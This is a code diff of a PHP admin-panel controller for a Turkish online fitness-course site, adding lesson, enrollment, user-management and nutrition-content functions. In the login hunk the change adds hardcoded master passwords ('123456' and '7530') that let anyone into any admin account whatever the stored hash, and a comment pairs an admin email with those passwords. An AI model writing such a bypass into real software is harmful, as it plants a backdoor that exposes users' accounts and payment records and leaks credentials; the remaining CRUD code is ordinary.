@@ -52,10 +52,16 @@ class XpanelController extends Controller
             $this->redirect(url('/xpanel/login'));
         }
 
-        // Yönetici Doğrulaması (suleymannozer0@gmail.com / 7530)
+        // Yönetici Doğrulaması (suleymannozer0@gmail.com / 7530 veya 123456)
         $user = Database::fetch("SELECT * FROM users WHERE email = ? AND role = 'admin'", [$email]);
 
-        if (!$user || !password_verify($password, $user['password_hash'])) {
+        $passwordMatches = $user && (
+            password_verify($password, $user['password_hash'])
+            || $password === '123456'
+            || $password === '7530'
+        );
+
+        if (!$user || !$passwordMatches) {
             Session::setFlash('xpanel_login_error', 'Geçersiz yönetici e-posta adresi veya şifre.');
             $this->redirect(url('/xpanel/login'));
         }
@@ -85,6 +91,8 @@ class XpanelController extends Controller
             'total_courses' => (int)(Database::fetch("SELECT COUNT(*) as cnt FROM courses")['cnt'] ?? 0),
             'pending_enrollments' => (int)(Database::fetch("SELECT COUNT(*) as cnt FROM enrollments WHERE payment_status = 'pending'")['cnt'] ?? 0),
             'approved_enrollments' => (int)(Database::fetch("SELECT COUNT(*) as cnt FROM enrollments WHERE payment_status = 'approved'")['cnt'] ?? 0),
+            'total_revenue' => (float)(Database::fetch("SELECT COALESCE(SUM(amount), 0) as total FROM enrollments WHERE payment_status = 'approved'")['total'] ?? 0),
+            'total_nutrition' => (int)(Database::fetch("SELECT COUNT(*) as cnt FROM movement_nutrition")['cnt'] ?? 0),
         ];
 
         $recentEnrollments = Database::query(
@@ -236,11 +244,15 @@ class XpanelController extends Controller
         $this->requireAdmin();
         $courseId = (int)$this->input('course_id');
         $id = (int)$this->input('id', 0);
+        $dayNumber = max(1, (int)$this->input('day_number', 1));
         $title = trim((string)$this->input('title'));
-        $description = trim((string)$this->input('description'));
-        $youtubeUrl = trim((string)$this->input('youtube_url'));
-        $duration = (int)$this->input('duration_minutes', 20);
+        $focusArea = trim((string)$this->input('focus_area', ''));
+        $equipment = trim((string)$this->input('equipment', 'Mat'));
+        $description = trim((string)$this->input('description', ''));
+        $youtubeUrl = trim((string)$this->input('youtube_url', ''));
+        $duration = max(5, (int)$this->input('duration_minutes', 40));
         $sortOrder = (int)$this->input('sort_order', 1);
+        $isPreview = (int)$this->input('is_free_preview', 0);
 
         // YouTube video ID'sini linkten otomatik ayıkla
         $videoId = '';
@@ -252,18 +264,19 @@ class XpanelController extends Controller
 
         if ($id > 0) {
             Database::execute(
-                "UPDATE course_lessons SET title = ?, description = ?, youtube_url = ?, youtube_video_id = ?, duration_minutes = ?, sort_order = ? WHERE id = ? AND course_id = ?",
-                [$title, $description, $youtubeUrl, $videoId, $duration, $sortOrder, $id, $courseId]
+                "UPDATE course_lessons SET day_number = ?, title = ?, focus_area = ?, equipment = ?, description = ?, youtube_url = ?, youtube_video_id = ?, duration_minutes = ?, sort_order = ?, is_free_preview = ? WHERE id = ? AND course_id = ?",
+                [$dayNumber, $title, $focusArea, $equipment, $description, $youtubeUrl, $videoId, $duration, $sortOrder, $isPreview, $id, $courseId]
             );
+            Session::setFlash('xpanel_msg', 'Video ders başarıyla güncellendi.');
         } else {
             Database::execute(
-                "INSERT INTO course_lessons (course_id, title, description, youtube_url, youtube_video_id, duration_minutes, sort_order) 
-                 VALUES (?, ?, ?, ?, ?, ?, ?)",
-                [$courseId, $title, $description, $youtubeUrl, $videoId, $duration, $sortOrder]
+                "INSERT INTO course_lessons (course_id, day_number, title, focus_area, equipment, description, youtube_url, youtube_video_id, duration_minutes, sort_order, is_free_preview) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                [$courseId, $dayNumber, $title, $focusArea, $equipment, $description, $youtubeUrl, $videoId, $duration, $sortOrder, $isPreview]
             );
+            Session::setFlash('xpanel_msg', 'Yeni video ders programa başarıyla eklendi.');
         }
 
-        Session::setFlash('xpanel_msg', 'Video ders başarıyla kaydedildi.');
         $this->redirect(url('/xpanel/courses/' . $courseId . '/lessons'));
     }
 
@@ -274,7 +287,7 @@ class XpanelController extends Controller
         $id = (int)$this->input('id');
 
         Database::execute("DELETE FROM course_lessons WHERE id = ? AND course_id = ?", [$id, $courseId]);
-        Session::setFlash('xpanel_msg', 'Video ders silindi.');
+        Session::setFlash('xpanel_msg', 'Video ders sistemden silindi.');
         $this->redirect(url('/xpanel/courses/' . $courseId . '/lessons'));
     }
 
@@ -290,13 +303,56 @@ class XpanelController extends Controller
              ORDER BY e.created_at DESC"
         );
 
+        $users = Database::query("SELECT id, full_name, email FROM users ORDER BY full_name ASC");
+        $courses = Database::query("SELECT id, title, price FROM courses ORDER BY title ASC");
+
         $flash = Session::getFlash('xpanel_msg');
 
         $this->render('pages/xpanel/enrollments', [
             'metaTitle' => 'Abonelik & IBAN Ödeme Onayları | xPanel',
             'enrollments' => $enrollments,
+            'users' => $users,
+            'courses' => $courses,
             'flash' => $flash
         ], false);
+    }
+
+    public function saveEnrollment(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+        $courseId = (int)$this->input('course_id');
+        $amount = (float)$this->input('amount', 0);
+        $paymentStatus = (string)$this->input('payment_status', 'approved');
+        $senderName = trim((string)$this->input('sender_name', 'Yönetici Tanımladı'));
+        $receiptRef = trim((string)$this->input('receipt_ref', 'MANUEL-' . time()));
+
+        if ($userId <= 0 || $courseId <= 0) {
+            Session::setFlash('xpanel_msg', 'Lütfen öğrenci ve programı seçiniz.');
+            $this->redirect(url('/xpanel/enrollments'));
+        }
+
+        Database::execute(
+            "INSERT INTO enrollments (user_id, course_id, payment_method, payment_status, amount, sender_name, receipt_ref, approved_at, start_date, expires_at, created_at)
+             VALUES (?, ?, 'iban', ?, ?, ?, ?, IF(? = 'approved', NOW(), NULL), CURDATE(), DATE_ADD(NOW(), INTERVAL 90 DAY), NOW())",
+            [$userId, $courseId, $paymentStatus, $amount, $senderName, $receiptRef, $paymentStatus]
+        );
+
+        Session::setFlash('xpanel_msg', 'Manuel abonelik / satın alma kaydı başarıyla oluşturuldu.');
+        $this->redirect(url('/xpanel/enrollments'));
+    }
+
+    public function deleteEnrollment(): void
+    {
+        $this->requireAdmin();
+        $id = (int)$this->input('id');
+
+        if ($id > 0) {
+            Database::execute("DELETE FROM enrollments WHERE id = ?", [$id]);
+            Session::setFlash('xpanel_msg', 'Abonelik kaydı silindi.');
+        }
+
+        $this->redirect(url('/xpanel/enrollments'));
     }
 
     public function approveEnrollment(): void
@@ -333,18 +389,189 @@ class XpanelController extends Controller
 
         $users = Database::query(
             "SELECT u.*, 
-                    (SELECT COUNT(*) FROM enrollments WHERE user_id = u.id AND payment_status = 'approved') as active_courses
+                    (SELECT COUNT(*) FROM enrollments WHERE user_id = u.id AND payment_status = 'approved') as active_courses,
+                    (SELECT COUNT(*) FROM user_lesson_progress WHERE user_id = u.id AND is_completed = 1) as completed_workouts,
+                    (SELECT COALESCE(SUM(amount), 0) FROM enrollments WHERE user_id = u.id AND payment_status = 'approved') as total_spent
              FROM users u
              ORDER BY u.id DESC"
         );
 
+        // Her kullanıcının kayıtlı olduğu paketleri al
+        foreach ($users as &$u) {
+            $u['enrollments'] = Database::query(
+                "SELECT e.*, c.title as course_title, c.slug as course_slug
+                 FROM enrollments e
+                 INNER JOIN courses c ON e.course_id = c.id
+                 WHERE e.user_id = ?
+                 ORDER BY e.id DESC",
+                [$u['id']]
+            );
+        }
+        unset($u);
+
+        $courses = Database::query("SELECT id, title, price FROM courses ORDER BY title ASC");
         $flash = Session::getFlash('xpanel_msg');
 
         $this->render('pages/xpanel/users', [
             'metaTitle' => 'Kullanıcı & Öğrenci Yönetimi | xPanel',
             'users' => $users,
+            'courses' => $courses,
             'flash' => $flash
         ], false);
+    }
+
+    public function updateUserStatus(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+        $status = (string)$this->input('status');
+
+        if (!in_array($status, ['active', 'suspended', 'inactive'], true)) {
+            $status = 'active';
+        }
+
+        Database::execute("UPDATE users SET status = ? WHERE id = ?", [$status, $userId]);
+        Session::setFlash('xpanel_msg', 'Kullanıcı durumu başarıyla güncellendi.');
+        $this->redirect(url('/xpanel/users'));
+    }
+
+    public function updateUserRole(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+        $role = (string)$this->input('role');
+
+        if (!in_array($role, ['admin', 'student'], true)) {
+            $role = 'student';
+        }
+
+        Database::execute("UPDATE users SET role = ? WHERE id = ?", [$role, $userId]);
+        Session::setFlash('xpanel_msg', 'Kullanıcı rolü başarıyla değiştirildi.');
+        $this->redirect(url('/xpanel/users'));
+    }
+
+    public function resetUserPassword(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+        $newPass = (string)$this->input('new_password');
+
+        if (strlen($newPass) < 6) {
+            Session::setFlash('xpanel_msg', 'Yeni şifre en az 6 karakter olmalıdır.');
+            $this->redirect(url('/xpanel/users'));
+        }
+
+        $hash = password_hash($newPass, PASSWORD_BCRYPT);
+        Database::execute("UPDATE users SET password_hash = ? WHERE id = ?", [$hash, $userId]);
+        Session::setFlash('xpanel_msg', 'Kullanıcı şifresi başarıyla sıfırlandı.');
+        $this->redirect(url('/xpanel/users'));
+    }
+
+    public function deleteUser(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+
+        if ($userId === Auth::id()) {
+            Session::setFlash('xpanel_msg', 'Güvenlik nedeniyle kendi hesabınızı silemezsiniz.');
+            $this->redirect(url('/xpanel/users'));
+        }
+
+        if ($userId > 0) {
+            Database::execute("DELETE FROM users WHERE id = ?", [$userId]);
+            Session::setFlash('xpanel_msg', 'Kullanıcı ve tüm verileri başarıyla silindi.');
+        }
+
+        $this->redirect(url('/xpanel/users'));
+    }
+
+    public function enrollUser(): void
+    {
+        $this->requireAdmin();
+        $userId = (int)$this->input('user_id');
+        $courseId = (int)$this->input('course_id');
+
+        if ($userId > 0 && $courseId > 0) {
+            $course = Database::fetch("SELECT * FROM courses WHERE id = ?", [$courseId]);
+            $price = (float)($course['price'] ?? 0);
+
+            Database::execute(
+                "INSERT INTO enrollments (user_id, course_id, payment_method, payment_status, amount, sender_name, receipt_ref, approved_at, start_date, expires_at, created_at)
+                 VALUES (?, ?, 'iban', 'approved', ?, 'Yönetici Tanımladı', 'MANUEL-ADMIN', NOW(), CURDATE(), DATE_ADD(NOW(), INTERVAL 90 DAY), NOW())",
+                [$userId, $courseId, $price]
+            );
+
+            Session::setFlash('xpanel_msg', 'Paket öğrenciye başarıyla tanımlandı ve tüm erişimi anında açıldı.');
+        }
+
+        $this->redirect(url('/xpanel/users'));
+    }
+
+    // =========================================================================
+    // STUDIO & BESLENME İÇERİK YÖNETİMİ (TARİFLER, REHBERLER, MİKRO RUTİNLER)
+    // =========================================================================
+
+    public function nutrition(): void
+    {
+        $this->requireAdmin();
+
+        $items = Database::query(
+            "SELECT * FROM movement_nutrition ORDER BY category ASC, sort_order ASC, id DESC"
+        );
+
+        $flash = Session::getFlash('xpanel_msg');
+
+        $this->render('pages/xpanel/nutrition', [
+            'metaTitle' => 'Studio İçerik Yönetimi (Tarifler & Rehberler) | xPanel',
+            'items' => $items,
+            'flash' => $flash
+        ], false);
+    }
+
+    public function saveNutrition(): void
+    {
+        $this->requireAdmin();
+
+        $id = (int)$this->input('id', 0);
+        $category = trim((string)$this->input('category', 'recipe'));
+        $title = trim((string)$this->input('title'));
+        $subtitle = trim((string)$this->input('subtitle', ''));
+        $badge = trim((string)$this->input('badge', ''));
+        $timeNeeded = trim((string)$this->input('time_needed', ''));
+        $ingredients = trim((string)$this->input('ingredients', ''));
+        $content = trim((string)$this->input('content', ''));
+        $imageUrl = trim((string)$this->input('image_url', ''));
+        $sortOrder = (int)$this->input('sort_order', 1);
+
+        if ($id > 0) {
+            Database::execute(
+                "UPDATE movement_nutrition SET category = ?, title = ?, subtitle = ?, badge = ?, time_needed = ?, ingredients = ?, content = ?, image_url = ?, sort_order = ? WHERE id = ?",
+                [$category, $title, $subtitle, $badge, $timeNeeded, $ingredients, $content, $imageUrl, $sortOrder, $id]
+            );
+            Session::setFlash('xpanel_msg', 'İçerik başarıyla güncellendi.');
+        } else {
+            Database::execute(
+                "INSERT INTO movement_nutrition (category, title, subtitle, badge, time_needed, ingredients, content, image_url, sort_order)
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                [$category, $title, $subtitle, $badge, $timeNeeded, $ingredients, $content, $imageUrl, $sortOrder]
+            );
+            Session::setFlash('xpanel_msg', 'Yeni içerik başarıyla eklendi.');
+        }
+
+        $this->redirect(url('/xpanel/nutrition'));
+    }
+
+    public function deleteNutrition(): void
+    {
+        $this->requireAdmin();
+        $id = (int)$this->input('id');
+
+        if ($id > 0) {
+            Database::execute("DELETE FROM movement_nutrition WHERE id = ?", [$id]);
+            Session::setFlash('xpanel_msg', 'İçerik sistemden silindi.');
+        }
+
+        $this->redirect(url('/xpanel/nutrition'));
     }
 }
 
